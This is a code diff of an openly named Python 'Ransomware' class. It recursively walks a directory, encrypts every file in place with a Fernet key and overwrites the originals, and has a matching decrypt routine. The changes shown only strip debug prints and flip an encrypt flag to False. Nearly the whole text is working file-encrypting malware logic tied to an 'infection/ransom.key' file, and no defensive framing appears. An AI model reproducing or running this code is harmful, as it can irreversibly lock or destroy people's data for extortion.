@@ -27,13 +27,10 @@ class Ransomware:
 		for x in os.walk(directory):
 			for item in glob.glob(os.path.join(x[0], "*")):
 				if os.path.isfile(item):
-					print("Item: " + item)
-					# key = base64.urlsafe_b64encode(key.encode("utf-8"))
 					evil_key = Fernet(key)
 					file = open(item, "rb")
 					encrypted_result = evil_key.encrypt(file.read())
 					file.close()
-					print("res: " + str(encrypted_result))
 					new_file = open(item, "wb")
 					new_file.write(encrypted_result)
 					new_file.close()
@@ -44,7 +41,6 @@ class Ransomware:
 		for x in os.walk(directory):
 			for item in glob.glob(os.path.join(x[0], "*")):
 				if os.path.isfile(item):
-					# key = base64.urlsafe_b64encode(key.encode("utf-8"))
 					evil_key = Fernet(key)
 					file = open(item, "rb")
 					decrypted_result = evil_key.decrypt(file.read())
@@ -56,7 +52,7 @@ class Ransomware:
 if __name__ == "__main__":
 	
 	# Change this if you want to decrypt. Don't decrypt if you haven't encrypted. 
-	encrypt = True
+	encrypt = False
 
 	ransomware = Ransomware()
 	if not path.exists("infection/ransom.key") and encrypt:
